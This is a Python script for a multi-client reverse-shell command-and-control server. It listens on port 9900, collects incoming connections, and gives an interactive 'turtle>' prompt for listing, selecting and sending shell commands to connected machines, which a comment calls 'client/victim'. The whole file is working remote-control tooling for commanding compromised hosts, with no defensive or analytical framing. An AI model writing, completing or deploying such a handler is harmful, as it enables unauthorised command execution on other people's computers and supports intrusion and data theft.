import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


# Create a socket

def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9900
        s = socket.socket()

    except socket.error as msg:
        print("Something went wrong while creating the socket." + str(msg)+"\n")


# Binding Port and Host together and listening for connection


def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port " + str(port)+"\n")

        s.bind((host, port))
        s.listen(5)  # After 5 bad connection s.listen() will throw error

    except socket.error as msg:
        print("Something went wrong while binding the port." + str(msg) + "\n Retrying...")
        bind_socket()


# Accepting connections from multiple clients (Socket must be listening) and saving them to a list

# Closing previous connections when server.py file is re-run

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(True)  # Prevents timeout

            all_connections.append(conn)
            all_addresses.append(address)

            print("Connection has been established with: "+address[0])

        except:
            print("An error occurred while accepting connections")


# Second thread's functions:
# 1) See all the clients, 2) Select a client, 3) Send commands to the selected clients

# Interactive prompt/shell for sending commands

# turtle> list
# 0 Friend-A Port
# 1 Friend-B Port
# 2 Friend-C Port
# turtle> select 1
# 192.168.0.112> dir

def start_turtle():

    while True:
        cmd = input("turtle>")
        if cmd == "list":
            list_connections()

        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognised")


# Display all current active connections with clients
def list_connections():
    results = ""

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(" "))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue

        results = str(i) + "  " + str(all_addresses[i][0]) + " " + str(all_addresses[i][1]) + "\n"
        print("----Clients----" + "\n" + results)


# Selecting the target client
def get_target(cmd):
    try:
        target = cmd.replace("select ", "") # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :" + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + ">", end="")
        return conn
        # 192.168.0.4> dir
    except:
        print("Selection not valid")
        return None


# Send commands to client/victim or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        j = queue.get()
        if j == 1:
            create_socket()
            bind_socket()
            accepting_connections()

        if j == 2:
            start_turtle()

        queue.task_done()


def create_jobs():
    for j in JOB_NUMBER:
        queue.put(j)

    queue.join()


create_workers()
create_jobs()

